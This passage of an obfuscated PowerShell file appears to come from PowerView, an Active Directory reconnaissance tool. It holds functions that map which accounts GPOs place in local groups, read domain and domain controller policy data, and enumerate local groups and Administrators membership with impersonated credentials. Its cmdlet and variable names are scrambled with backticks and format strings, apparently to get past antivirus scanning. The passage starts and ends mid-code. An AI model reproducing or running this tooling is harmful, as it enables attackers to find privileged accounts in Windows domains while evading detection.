                ${OuIn`dEx} = ${DN}.("{1}{0}{2}"-f 'dexO','In','f').Invoke('OU=')
                if (${Oui`Nd`EX} -gt 0) {
                    ${O`UNA`ME} = ${Dn}.("{0}{2}{1}" -f'SubStr','g','in').Invoke(${o`UIND`eX})
                }
                if (${Ou`Na`Me}) {
                    ${GpO`G`U`Ids} += &("{0}{2}{1}"-f 'Get-Do','U','mainO') @CommonArguments -SearchBase ${OU`N`Ame} -LDAPFilter ("{2}{0}{1}{3}" -f 'k=','*','(gplin',')') | &("{0}{2}{1}" -f 'F','-Object','orEach') {
                        &("{1}{0}{2}"-f'n','Select-Stri','g') -InputObject ${_}."gpl`Ink" -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | &("{2}{4}{0}{3}{1}" -f'ach-O','ect','For','bj','E') {${_}."m`AT`ChES" | &("{1}{3}{2}{4}{0}" -f 'ct','Se','b','lect-O','je') -ExpandProperty ("{0}{1}"-f'Valu','e') }
                    }
                }

                
                &("{1}{2}{0}" -f'erbose','Write-','V') "Enumerating the sitename for: $($Computer.dnshostname) "
                ${cOmPut`e`R`Si`TE} = (&("{1}{4}{2}{0}{3}"-f 'Compu','Get','et','terSiteName','-N') -ComputerName ${COmPUt`er}."dn`sHosT`Na`mE")."SITE`NA`me"
                if (${com`pUt`eRs`I`TE} -and (${C`OMp`UteRSiTe} -notmatch ("{1}{0}" -f 'r','Erro'))) {
                    ${g`po`GUids} += &("{0}{3}{1}{2}"-f 'G','inS','ite','et-Doma') @CommonArguments -Identity ${cOmpUt`e`RS`ite} -LDAPFilter (("{3}{0}{2}{1}" -f'gpl','*)','ink=','(')) | &("{3}{0}{2}{1}" -f'Each','bject','-O','For') {
                        &("{0}{3}{1}{2}"-f 'S','tr','ing','elect-S') -InputObject ${_}."g`PLiNK" -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | &("{3}{0}{1}{2}" -f '-O','bje','ct','ForEach') {${_}."ma`TCh`Es" | &("{2}{1}{0}" -f'bject','ect-O','Sel') -ExpandProperty ("{1}{0}"-f 'e','Valu') }
                    }
                }

                
                ${G`PoGuI`DS} | &("{4}{1}{5}{6}{2}{3}{0}" -f'oup','Domai','G','r','Get-','nGPOLoc','al') @CommonArguments | &("{0}{2}{1}"-f'Sort-Ob','ect','j') -Property ("{1}{2}{0}"-f'e','GPONa','m') -Unique | &("{2}{0}{3}{1}" -f 'Each','t','For','-Objec') {
                    ${gpog`R`o`UP} = ${_}

                    if(${GP`ogro`UP}."GrOUp`M`eMb`eRS") {
                        ${gp`oM`eM`Bers} = ${g`POg`ROup}."GR`oUpM`emB`eRS"
                    }
                    else {
                        ${GPome`M`BErS} = ${g`pogROUP}."GrOup`sID"
                    }

                    ${GPom`Em`Be`RS} | &("{1}{2}{3}{0}"-f'Object','F','orEac','h-') {
                        ${OB`jE`ct} = &("{1}{0}{3}{2}{4}" -f '-D','Get','n','omai','Object') @CommonArguments -Identity ${_}
                        ${I`S`grOup} = @(("{2}{1}{0}"-f'456','68435','2'),("{1}{0}"-f '457','268435'),("{1}{0}{2}" -f '0','53687','912'),("{0}{2}{1}" -f'53','913','6870')) -contains ${O`BjE`Ct}."Sam`ACcO`Un`TTYPe"

                        ${gp`O`cOm`PuTERLOcaLG`Ro`UPmeMBEr} = &("{1}{2}{0}{3}" -f'w-Objec','N','e','t') ("{0}{1}" -f'PSO','bject')
                        ${gPo`coMP`U`TErlOC`A`Lgr`OUPMe`mb`ER} | &("{1}{2}{3}{0}"-f'er','Add-','Mem','b') ("{0}{3}{2}{1}"-f 'N','y','ert','oteprop') ("{1}{0}{2}"-f 'puterNa','Com','me') ${C`o`MPUt`eR}."DN`S`hoStNamE"
                        ${gPoCoMpUt`E`Rl`oCa`l`gROUpmE`MBEr} | &("{0}{1}{2}" -f 'Add','-Memb','er') ("{0}{1}{3}{2}"-f 'Notepro','p','rty','e') ("{1}{2}{3}{0}" -f'me','Obje','c','tNa') ${o`B`JecT}."SaMaC`coU`NTn`Ame"
                        ${Gpoco`m`puTErlO`CALgroU`PmeMB`eR} | &("{3}{0}{1}{2}" -f'e','m','ber','Add-M') ("{0}{3}{1}{2}" -f 'No','opert','y','tepr') ("{0}{2}{1}" -f'Obje','N','ctD') ${o`BJ`ecT}."d`i`STINguIsHed`NAMe"
                        ${gpoCoMpuT`Er`LoCA`LgroU`pmEmBEr} | &("{3}{2}{0}{1}" -f 'd-Memb','er','d','A') ("{2}{1}{0}{3}"-f 'r','prope','Note','ty') ("{0}{1}{2}" -f 'O','bjec','tSID') ${_}
                        ${g`PoCOmpuTer`l`Oc`ALGrOUpMEm`BeR} | &("{2}{0}{1}"-f'be','r','Add-Mem') ("{1}{2}{3}{0}" -f'y','Not','epr','opert') ("{2}{1}{0}"-f 'p','Grou','Is') ${iSG`ROUp}
                        ${gP`OCOm`p`UtErLocaLgRouP`M`eMb`eR} | &("{3}{2}{0}{1}"-f 'Mem','ber','-','Add') ("{3}{1}{0}{2}" -f 'pe','o','rty','Notepr') ("{0}{1}{3}{2}{4}" -f'GP','OD','yN','ispla','ame') ${g`PogR`OUp}."gpodISp`L`AYname"
                        ${G`pocoM`pUtERLOca`L`gRO`UPMEMbER} | &("{1}{2}{0}"-f'er','Ad','d-Memb') ("{1}{0}{2}{3}"-f 'epr','Not','ope','rty') ("{0}{1}" -f 'G','POGuid') ${G`pO`GRo`Up}."gP`OnAMe"
                        ${gpOco`Mp`UtE`RlOCAL`gr`oUPMe`m`B`ER} | &("{0}{3}{1}{2}" -f 'A','d-Mem','ber','d') ("{2}{1}{0}" -f'erty','op','Notepr') ("{0}{1}"-f 'GPOPat','h') ${gP`Ogro`UP}."GpOp`Ath"
                        ${gP`OC`omPuteRLOc`Al`G`RoUp`MEmber} | &("{0}{3}{2}{1}" -f 'Add-M','r','mbe','e') ("{0}{2}{1}{3}"-f 'Notepr','rt','ope','y') ("{0}{1}"-f 'GPOTyp','e') ${g`PogrO`UP}."GpoTY`PE"
                        ${G`P`OcomPUT`E`RLOcA`LGrOUPm`eMBER}."PsobJe`Ct"."tY`PE`NaMES".("{1}{0}"-f'd','Ad').Invoke(("{9}{6}{1}{0}{4}{2}{5}{8}{3}{10}{7}" -f 'ew.GPOCom','rVi','t','o','pu','erLoca','owe','ber','lGr','P','upMem'))
                        ${GP`OC`OM`pUt`ER`l`O`cALGRoupMeM`Ber}
                    }
                }
            }
        }
    }
}


function GET-`doMA`iNPOl`i`cy`daTA {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{2}{0}" -f'rocess','PSShou','P','ld'}, '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(PoSitIoN = 0, vaLUEFrOMPIPeLiNe = ${t`RuE}, valUefRompiPElINEBYproPeRTYnAMe = ${TR`UE})]
        [Alias({"{0}{1}{2}"-f'Sou','r','ce'}, {"{0}{1}" -f'Na','me'})]
        [String]
        ${po`LICY} = ("{0}{1}"-f'Domai','n'),

        [ValidateNotNullOrEmpty()]
        [String]
        ${DOm`AIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{5}{0}{4}{3}{2}"-f'tro','D','r','e','ll','omainCon'})]
        [String]
        ${SErv`Er},

        [ValidateRange(1, 10000)]
        [Int]
        ${Ser`VeR`TimeLi`M`IT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crEDeNt`i`Al} =   ( vaRIABle ('Q'+'Fn'))."VA`Lue"::"E`MPTY"
    )

    BEGIN {
        ${SEAR`ch`Erarg`U`meNTS} = @{}
        if (${PsB`oUn`dP`A`RAMeT`ERs}[("{1}{0}" -f'erver','S')]) { ${sEa`RCHeRAR`Gum`e`NTs}[("{0}{1}"-f 'Serve','r')] = ${S`e`Rver} }
        if (${P`S`BOunDPa`R`AMETErS}[("{2}{3}{1}{0}"-f't','eLimi','ServerTi','m')]) { ${Sea`RCHEr`A`Rg`UMEnTs}[("{1}{2}{4}{3}{0}" -f'it','S','erverTime','im','L')] = ${s`er`V`eRTim`ElIMIt} }
        if (${p`sbouNDPArAM`ete`RS}[("{0}{2}{1}"-f 'Cre','ial','dent')]) { ${SeA`Rc`hE`RARgumE`NTS}[("{1}{2}{0}" -f'ential','Cre','d')] = ${C`Re`d`EntIAl} }

        ${CoNv`er`T`ArgumeN`Ts} = @{}
        if (${p`SbouN`dPa`RA`mETers}[("{0}{2}{1}"-f'Serv','r','e')]) { ${CONvERT`Ar`GUMeN`Ts}[("{0}{1}"-f 'Ser','ver')] = ${se`RV`eR} }
        if (${pS`BOUndPAR`AMET`ERS}[("{0}{1}{2}"-f 'Credent','i','al')]) { ${conveR`TA`RGUm`Ents}[("{1}{2}{0}"-f'tial','Crede','n')] = ${c`REDE`Nt`iAL} }
    }

    PROCESS {
        if (${Psb`ound`P`AR`AME`TErs}[("{1}{0}"-f 'omain','D')]) {
            ${SeaR`cHe`RaRgU`m`En`Ts}[("{1}{0}" -f 'omain','D')] = ${DOMa`iN}
            ${ConV`eR`TAr`GUMEnTS}[("{0}{1}"-f'Doma','in')] = ${DOM`A`iN}
        }

        if (${p`OLI`cy} -eq 'All') {
            ${sE`A`RchErARgUmE`NTs}[("{1}{0}" -f 'y','Identit')] = '*'
        }
        elseif (${Poli`cy} -eq ("{2}{0}{1}"-f 'i','n','Doma')) {
            ${se`AR`ch`E`RARGUMeN`Ts}[("{2}{0}{1}" -f 'd','entity','I')] = '{31B2F340-016D-11D2-945F-00C04FB984F9}'
        }
        elseif ((${P`oLiCY} -eq ("{0}{2}{3}{1}{4}" -f'Do','ontrol','mai','nC','ler')) -or (${Pol`I`cy} -eq 'DC')) {
            ${s`eaRCH`ErarGu`mENts}[("{1}{0}{2}" -f'i','Ident','ty')] = '{6AC1786C-016F-11D2-945F-00C04FB984F9}'
        }
        else {
            ${S`EARCH`eRargu`menTs}[("{0}{2}{1}"-f 'I','ity','dent')] = ${po`l`icy}
        }

        ${gPo`REs`ULTs} = &("{1}{0}{2}{3}"-f 'ai','Get-Dom','n','GPO') @SearcherArguments

        ForEach (${g`PO} in ${gp`oresu`LTs}) {
            
            ${Gp`TTM`PL`PAtH} = ${G`po}."Gpc`Fi`Les`YspaTH" + ((("{7}{2}{3}{4}{8}{9}{10}{6}{1}{5}{0}{11}"-f 'diteAnGptT','eAnS','MACHINEeA','nM','icrosofteAnWi','ecE','s NT','eAn','n','do','w','mpl.inf')) -cRepLACE 'eAn',[char]92)

            ${PaR`sEar`Gs} =  @{
                ("{1}{2}{0}" -f'h','GptTmp','lPat') = ${gpt`TmPlp`Ath}
                ("{0}{2}{3}{1}" -f'Ou','tObject','tp','u') = ${T`RUE}
            }
            if (${PSb`O`UnDpar`Am`E`TeRS}[("{1}{0}{2}" -f'ede','Cr','ntial')]) { ${PaR`sEar`gS}[("{0}{2}{1}"-f'Credent','l','ia')] = ${cRede`N`TIAL} }

            
            &("{0}{3}{2}{1}"-f 'Get-','l','ptTmp','G') @ParseArgs | &("{0}{2}{1}"-f'ForEach-O','ct','bje') {
                ${_} | &("{2}{3}{0}{1}" -f 'd','-Member','A','d') ("{1}{2}{3}{0}" -f 'perty','N','o','tepro') ("{0}{1}" -f 'GPONam','e') ${G`pO}."Na`ME"
                ${_} | &("{1}{3}{2}{0}" -f'ember','A','-M','dd') ("{1}{2}{0}{3}" -f 'e','Notepro','p','rty') ("{2}{0}{1}{3}"-f 'ODispl','a','GP','yName') ${G`po}."DIsPl`A`ynaME"
                ${_}
            }
        }
    }
}










function G`ET-NET`LOCaL`G`ROup {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{4}{0}{2}" -f'e','P','ss','SShouldPro','c'}, '')]
    [OutputType({"{1}{3}{6}{2}{0}{4}{5}"-f'Group.A','Pow','cal','erV','P','I','iew.Lo'})]
    [OutputType({"{2}{0}{3}{4}{1}{5}{6}"-f'iew','up','PowerV','.LocalG','ro','.','WinNT'})]
    [CmdletBinding()]
    Param(
        [Parameter(poSITiOn = 0, ValuEFROmPIPeLiNe = ${Tr`UE}, VaLUEfROMpIPelineBYproPErTYnamE = ${t`RUE})]
        [Alias({"{1}{0}{2}"-f'am','HostN','e'}, {"{2}{1}{0}" -f'ostname','nsh','d'}, {"{1}{0}" -f 'ame','n'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${c`o`mPUTERn`Ame} = ${EN`V:CO`MPu`TERnA`Me},

        [ValidateSet('API', {"{1}{0}" -f'T','WinN'})]
        [Alias({"{2}{0}{1}{4}{3}" -f'on','Meth','Collecti','d','o'})]
        [String]
        ${mET`h`OD} = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRED`E`NTiAL} =  ${Q`FN}::"eM`pTy"
    )

    BEGIN {
        if (${ps`B`o`UnDpA`RAMeTeRs}[("{2}{1}{0}" -f 'ial','t','Creden')]) {
            ${loG`ont`O`KEN} = &("{2}{1}{3}{0}{5}{4}" -f 'erIm','v','In','oke-Us','ion','personat') -Credential ${CRED`EN`T`IaL}
        }
    }

    PROCESS {
        ForEach (${Co`M`PUTeR} in ${C`omPU`T`ERNAmE}) {
            if (${M`eTh`oD} -eq 'API') {
                

                
                ${QU`eryLE`Vel} = 1
                ${Ptr`Info} =  ( vArIabLe ("{0}{1}" -f 'K','egsB') )."Val`UE"::"ze`Ro"
                ${ENt`R`IeS`READ} = 0
                ${t`OtALr`e`AD} = 0
                ${Res`UmE`handLe} = 0

                
                ${reS`Ult} = ${NEt`APi`32}::"ne`TlOCalg`Rou`PE`NUm"(${co`Mput`eR}, ${quE`Ryl`EVEL}, [ref]${pT`Ri`NFO}, -1, [ref]${eNT`RIE`s`READ}, [ref]${To`T`Alread}, [ref]${resUMEH`And`le})

                
                ${O`FF`SeT} = ${pTR`i`NfO}.("{0}{1}{2}"-f'T','o','Int64').Invoke()

                
                if ((${r`Es`Ult} -eq 0) -and (${O`F`FsEt} -gt 0)) {

                    
                    ${I`Ncr`emENT} = ${loCAlg`RoUP_`I`N`Fo_1}::("{0}{1}{2}" -f'GetSi','z','e').Invoke()

                    
                    for (${i} = 0; (${I} -lt ${entR`Ie`sR`EAD}); ${i}++) {
                        
                        ${n`Ew`iNtpTr} = &("{3}{1}{0}{2}"-f'e','w-Obj','ct','Ne') ("{2}{3}{0}{1}" -f 'tem.','Intptr','S','ys') -ArgumentList ${O`Ffset}
                        ${I`NFO} = ${nEwiN`T`PtR} -as ${lO`C`AlgRoUp`_I`Nfo_1}

                        ${O`Ff`sEt} = ${ne`wiNTp`Tr}.("{1}{0}" -f 'Int64','To').Invoke()
                        ${o`Ff`sEt} += ${iNcre`m`ENt}

                        ${l`O`CA`LgROuP} = &("{0}{2}{1}"-f'New-Ob','ct','je') ("{0}{2}{1}" -f 'PSObje','t','c')
                        ${lOc`A`Lg`ROUP} | &("{0}{2}{1}"-f 'Add-','mber','Me') ("{3}{2}{1}{0}" -f 'ty','teproper','o','N') ("{1}{3}{0}{2}" -f 'e','C','rName','omput') ${c`omPUt`ER}
                        ${l`o`CAlGROUp} | &("{2}{1}{0}" -f'ber','m','Add-Me') ("{2}{0}{3}{1}"-f 'tep','rty','No','rope') ("{1}{0}{2}" -f 'oupNa','Gr','me') ${I`NFO}."lgRpI1_`N`AmE"
                        ${L`o`calGr`OUp} | &("{1}{0}{2}"-f'd-Memb','Ad','er') ("{0}{2}{3}{1}"-f'No','erty','tep','rop') ("{0}{2}{1}" -f 'C','t','ommen') ${i`NfO}."lGr`PI`1`_`coMMENt"
                        ${lOca`lgr`O`UP}."P`s`OBJECt"."tY`PE`NAMes".("{0}{1}"-f 'In','sert').Invoke(0, ("{0}{2}{3}{1}{4}" -f 'Power','oup.','V','iew.LocalGr','API'))
                        ${lOc`AlGRo`Up}
                    }
                    
                    ${n`UlL} = ${N`etApi`32}::("{3}{1}{5}{2}{4}{0}"-f'ee','et','ufferF','N','r','ApiB').Invoke(${P`TRiNFO})
                }
                else {
                    &("{1}{0}{2}"-f'ite-Verb','Wr','ose') "[Get-NetLocalGroup] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
                }
            }
            else {
                
                ${C`OM`PU`TErpRoVi`DEr} = [ADSI]"WinNT://$Computer,computer"

                ${comp`U`TERpR`OV`i`Der}."ps`Ba`Se"."Chil`dR`en" | &("{1}{2}{0}" -f'ject','Wher','e-Ob') { ${_}."P`SBAsE"."SCheMA`C`lA`SSnAmE" -eq ("{1}{0}"-f'p','grou') } | &("{2}{0}{1}" -f 'ach-Ob','ject','ForE') {
                    ${LoC`A`LgRoUP} = ([ADSI]${_})
                    ${g`RouP} = &("{1}{2}{0}" -f'ject','N','ew-Ob') ("{1}{0}{2}" -f'SObjec','P','t')
                    ${GR`oup} | &("{2}{0}{1}" -f'dd-Me','mber','A') ("{1}{0}{2}" -f 'ot','N','eproperty') ("{1}{0}{3}{2}"-f 'uter','Comp','me','Na') ${cO`m`put`eR}
                    ${G`ROup} | &("{1}{0}{2}" -f 'd-','Ad','Member') ("{2}{0}{1}{3}" -f'prop','ert','Note','y') ("{3}{0}{2}{1}" -f 'u','e','pNam','Gro') (${Lo`cA`lgROuP}.("{0}{1}{2}" -f 'I','nvokeG','et').Invoke(("{0}{1}" -f'N','ame')))
                    ${G`R`Oup} | &("{2}{1}{0}" -f 'ember','dd-M','A') ("{0}{1}{2}" -f 'Note','prope','rty') 'SID' ((&("{1}{2}{0}{3}"-f 'ec','Ne','w-Obj','t') ("{1}{7}{6}{4}{2}{0}{5}{3}"-f 'ipal.Sec','System.Se','nc','rityIdentifier','ri','u','.P','curity')(${LO`cAlGRo`Up}.("{1}{0}{2}"-f'nvokeGe','I','t').Invoke(("{2}{0}{1}"-f 'ec','tsid','obj')),0))."VaL`Ue")
                    ${G`Roup} | &("{1}{0}{2}{3}"-f'd','Ad','-Memb','er') ("{1}{3}{2}{0}"-f 'rty','N','eprope','ot') ("{1}{0}{2}"-f 'm','Co','ment') (${l`Ocal`GrOuP}.("{2}{1}{0}" -f 't','vokeGe','In').Invoke(("{0}{1}{2}" -f 'Des','cript','ion')))
                    ${g`Ro`Up}."P`sobjECT"."TYpE`NAmEs".("{0}{1}" -f'Ins','ert').Invoke(0, ("{4}{1}{0}{2}{3}" -f'w.LocalGro','werVie','up.W','inNT','Po'))
                    ${GR`O`Up}
                }
            }
        }
    }
    
    END {
        if (${L`OgONT`oKEN}) {
            &("{1}{0}{2}{3}" -f'ke','Invo','-RevertTo','Self') -TokenHandle ${Lo`GO`NTo`kEn}
        }
    }
}


function geT-neTl`oCalG`Rou`pme`mBer {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{1}{3}"-f'hou','ld','PSS','Process'}, '')]
    [OutputType({"{2}{6}{5}{1}{8}{3}{4}{7}{0}"-f'PI','.','Po','calG','r','iew','werV','oupMember.A','Lo'})]
    [OutputType({"{8}{3}{2}{0}{6}{5}{1}{7}{4}"-f'LocalG','pMember.','.','erView','NT','ou','r','Win','Pow'})]
    Param(
        [Parameter(pOSiTiON = 0, VaLUeFrOmPIpelInE = ${TR`UE}, vaLuefRompipELInEBypROpERtYnAMe = ${t`RuE})]
        [Alias({"{0}{1}"-f'Host','Name'}, {"{1}{0}{2}"-f'os','dnsh','tname'}, {"{0}{1}"-f'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${cOMp`UtE`RNAmE} = ${en`V:coMpute`RN`Ame},

        [Parameter(vAluEfRoMpIpelInEBYPropErtyNAmE = ${Tr`Ue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${gRO`Up`NaME} = ("{3}{1}{4}{0}{2}"-f 'trator','mi','s','Ad','nis'),

        [ValidateSet('API', {"{0}{1}" -f'WinN','T'})]
        [Alias({"{3}{1}{4}{2}{0}"-f'd','lecti','o','Col','onMeth'})]
        [String]
        ${m`e`THOd} = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crE`dENT`IaL} =   (GEt-vAriaBLe ("{0}{1}" -f'q','Fn') -VAlUEO )::"em`pTY"
    )

    BEGIN {
        if (${P`S`BoUnDp`ArAmEteRs}[("{0}{2}{1}" -f 'Cre','tial','den')]) {
            ${LOG`Ont`okEN} = &("{3}{2}{4}{1}{0}" -f 'sonation','per','-Us','Invoke','erIm') -Credential ${CR`eDe`NtI`Al}
        }
    }

    PROCESS {
        ForEach (${c`omput`eR} in ${cOmP`U`T`erNAme}) {
            if (${ME`T`hod} -eq 'API') {
                

                
                ${QU`ERYlEV`eL} = 2
                ${PtR`I`NFO} =   (GeT-varIaBLe ("{1}{0}"-f'egsB','K')  )."va`LuE"::"Z`ero"
                ${ENtr`IEs`Re`AD} = 0
                ${t`otALr`ead} = 0
                ${res`UMEhAND`Le} = 0

                
                ${r`ESU`LT} = ${NeT`APi`32}::("{1}{0}{4}{5}{3}{2}{6}" -f'tLocalGroup','Ne','be','m','G','etMe','rs').Invoke(${cOmpu`T`er}, ${GRO`Upn`Ame}, ${QU`E`RYl`eVEl}, [ref]${P`TrIn`Fo}, -1, [ref]${EntrI`eSrE`Ad}, [ref]${t`OT`A`lReAD}, [ref]${r`EsumeHAN`D`LE})

                
                ${oF`FSeT} = ${PT`RiN`Fo}.("{2}{0}{1}" -f 'In','t64','To').Invoke()

                ${mEMB`e`RS} = @()

                
                if ((${RESU`LT} -eq 0) -and (${Off`sET} -gt 0)) {

                    
                    ${iNcR`em`EnT} = ${L`oCa`Lg`ROu`p_Memb`E`R`S_INfo`_2}::("{0}{2}{1}"-f'GetSi','e','z').Invoke()

                    
                    for (${I} = 0; (${i} -lt ${eN`T`RIES`REaD}); ${i}++) {
                        
                        ${n`ewI`NTptR} = &("{2}{1}{0}"-f 'ct','-Obje','New') ("{0}{3}{1}{2}"-f'System.','t','r','Intp') -ArgumentList ${OF`FSet}
                        ${in`Fo} = ${nEwiN`T`PTR} -as ${L`OCaLg`ROUP_mEmbEr`S_I`NFo_2}

                        ${of`Fs`Et} = ${N`Ew`INtptR}.("{0}{1}{2}"-f 'ToI','nt','64').Invoke()
                        ${O`FF`set} += ${i`NCR`emEnt}

                        ${sIdsT`R`ING} = ''
                        ${r`e`sulT2} = ${a`dvAp`i`32}::"cOnve`RtsiDtos`Tr`i`NgSiD"(${I`NfO}."l`gRmI2_s`Id", [ref]${Si`D`StrIng});${laSt`Er`ROr} =   ${3rx8`Iv}::("{0}{2}{1}{3}" -f 'G','astWin32','etL','Error').Invoke()

                        if (${Re`s`Ult2} -eq 0) {
                            &("{1}{0}{2}{3}"-f 'e-','Writ','Verb','ose') "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                        }
                        else {
                            ${Me`Mber} = &("{2}{0}{3}{1}" -f'b','ct','New-O','je') ("{0}{1}" -f 'PSObje','ct')
                            ${MEm`Ber} | &("{2}{1}{0}" -f 'r','mbe','Add-Me') ("{1}{2}{0}"-f'ty','Not','eproper') ("{1}{3}{0}{2}"-f 'erNam','Comp','e','ut') ${c`OMP`Ut`eR}
                            ${M`EmBer} | &("{0}{2}{1}" -f'Ad','ember','d-M') ("{2}{0}{1}"-f'e','rty','Noteprop') ("{2}{0}{1}"-f 'roupN','ame','G') ${gr`O`UP`NAME}
                            ${ME`m`BER} | &("{3}{0}{1}{2}"-f 'dd','-Mem','ber','A') ("{2}{3}{0}{1}" -f'rope','rty','Note','p') ("{1}{2}{0}" -f'erName','Me','mb') ${In`Fo}."LGR`Mi2_DOMAIna`NDn`AMe"
                            ${mE`MbER} | &("{2}{3}{1}{0}" -f 'ber','Mem','Ad','d-') ("{2}{1}{0}" -f'ty','oteproper','N') 'SID' ${SI`ds`TriNG}
                            ${iSg`RO`Up} = $(${In`FO}."LgrMi2`_s`iDu`sA`gE" -eq ("{0}{1}{3}{2}" -f 'S','idT','roup','ypeG'))
                            ${mE`MbeR} | &("{1}{0}{3}{2}"-f 'm','Add-Me','r','be') ("{0}{1}{3}{2}" -f'N','o','operty','tepr') ("{1}{2}{0}" -f'oup','I','sGr') ${iSg`Ro`UP}
                            ${me`mBER}."pSobJ`ect"."tYP`enAM`Es".("{0}{2}{1}"-f 'I','ert','ns').Invoke(0, ("{2}{0}{5}{3}{1}{4}"-f 'ew.Local','ember.A','PowerVi','upM','PI','Gro'))
                            ${MEM`Be`Rs} += ${m`E`MBER}
                        }
                    }

                    
                    ${Nu`Ll} = ${n`E`Tapi32}::("{3}{2}{0}{4}{1}"-f'ApiBuffe','ree','t','Ne','rF').Invoke(${P`Tr`INfo})

                    
                    ${M`AC`h`ineSId} = ${M`EmBe`Rs} | &("{0}{1}{2}"-f 'Where-','O','bject') {${_}."s`iD" -match ("{1}{0}"-f '*-500','.') -or (${_}."s`Id" -match ("{1}{0}"-f'501','.*-'))} | &("{2}{1}{0}" -f 'ect-Object','l','Se') -Expand ("{1}{0}"-f'ID','S')
                    if (${m`A`ChiNES`id}) {
                        ${M`A`ChiN`ESId} = ${MaCHIne`s`iD}.("{0}{1}{2}" -f 'Subs','t','ring').Invoke(0, ${macH`iN`ES`iD}.("{1}{3}{0}{2}" -f 'xO','Last','f','Inde').Invoke('-'))

                        ${MEM`BeRs} | &("{0}{1}{2}"-f 'ForE','ach-','Object') {
                            if (${_}."s`iD" -match ${mAc`h`ines`ID}) {
                                ${_} | &("{0}{1}{2}" -f'Ad','d-Memb','er') ("{0}{2}{1}{3}" -f'N','teprope','o','rty') ("{0}{2}{1}" -f'IsD','ain','om') ${f`A`LSe}
                            }
                            else {
                                ${_} | &("{0}{2}{3}{1}"-f 'A','mber','dd-','Me') ("{0}{2}{1}"-f 'No','rty','teprope') ("{1}{0}{2}"-f 's','I','Domain') ${TR`UE}
                            }
                        }
                    }
                    else {
                        ${me`Mb`ERS} | &("{0}{1}{2}{3}"-f 'ForEac','h-','Objec','t') {
                            if (${_}."s`id" -notmatch ("{1}{0}"-f '1','S-1-5-2')) {
                                ${_} | &("{2}{1}{0}" -f 'mber','-Me','Add') ("{2}{0}{1}" -f 'pro','perty','Note') ("{1}{2}{0}"-f'n','IsD','omai') ${fA`Lse}
                            }
                            else {
                                ${_} | &("{0}{3}{1}{2}"-f 'Add','embe','r','-M') ("{0}{2}{1}{3}" -f 'Note','pe','pro','rty') ("{0}{2}{1}" -f 'I','ain','sDom') ("{2}{1}{0}"-f'N','NKNOW','U')
                            }
                        }
                    }
                    ${mEmB`e`RS}
                }
                else {
                    &("{2}{3}{0}{1}" -f 'e-Verb','ose','W','rit') "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
                }
            }
            else {
                
                try {
                    ${G`RO`UPPR`ovidER} = [ADSI]"WinNT://$Computer/$GroupName,group"

                    ${GrOupprO`V`id`er}."PsBa`SE"."i`N`VoKe"(("{1}{0}" -f 'mbers','Me')) | &("{0}{2}{4}{1}{3}"-f'Fo','Obje','rEa','ct','ch-') {

                        ${mem`BEr} = &("{1}{0}{2}" -f'Objec','New-','t') ("{0}{1}{2}" -f'PSObje','c','t')
                        ${mE`MBer} | &("{0}{1}{2}" -f'Ad','d-Me','mber') ("{2}{3}{0}{1}"-f'ope','rty','Note','pr') ("{0}{1}{2}"-f'Comput','erNa','me') ${Co`Mp`U`TeR}
                        ${M`EMb`Er} | &("{2}{1}{0}{3}" -f 'M','-','Add','ember') ("{2}{0}{1}"-f 'p','roperty','Note') ("{2}{0}{1}"-f'roup','Name','G') ${grO`UpNa`Me}

                        ${lOca`lus`er} = ([ADSI]${_})
                        ${adSpa`Th} = ${LOcal`U`Ser}.("{1}{0}"-f 'eGet','Invok').Invoke(("{2}{1}{0}"-f'Path','s','Ad')).("{1}{0}" -f'place','Re').Invoke(("{0}{1}{2}"-f'Win','NT:','//'), '')
                        ${Isg`RO`Up} = (${loc`A`LuS`Er}."S`C`HEMAClaS`sNaMe" -like ("{1}{0}"-f 'p','grou'))

                        if((  (GI ("{0}{2}{1}{3}{4}" -f 'Va','IAb','r','Le',':c597'))."va`LuE"::("{0}{1}{2}"-f 'Matc','h','es').Invoke(${AdS`PATH}, '/'))."cou`Nt" -eq 1) {
                            
                            ${mEm`BER`isd`OMaiN} = ${tr`Ue}
                            ${n`AMe} = ${Ad`S`PAth}.("{1}{0}" -f 'e','Replac').Invoke('/', '\')
                        }
                        else {
                            
                            ${MEm`B`erIS`DOMAiN} = ${f`AlsE}
                            ${N`AMe} = ${a`Dsp`Ath}.("{0}{1}{2}"-f'Subs','trin','g').Invoke(${adS`pA`Th}.("{0}{1}" -f 'In','dexOf').Invoke('/')+1).("{1}{0}{2}" -f'epl','R','ace').Invoke('/', '\')
                        }

                        ${MEm`B`er} | &("{2}{1}{0}"-f'r','e','Add-Memb') ("{0}{3}{1}{2}" -f 'No','eprop','erty','t') ("{0}{1}{2}" -f 'Ac','co','untName') ${N`AMe}
                        ${m`eMbEr} | &("{1}{2}{0}" -f 'ember','Ad','d-M') ("{3}{0}{1}{2}"-f 'oteprop','ert','y','N') 'SID' ((&("{1}{2}{0}"-f'-Object','Ne','w') ("{9}{0}{2}{8}{6}{5}{4}{3}{7}{1}"-f 'm.','ier','Security.Pr','e','.SecurityId','al','p','ntif','inci','Syste')(${L`Oc`AluSeR}.("{0}{1}"-f 'I','nvokeGet').Invoke(("{1}{3}{2}{0}" -f 'D','Obje','tSI','c')),0))."va`lue")
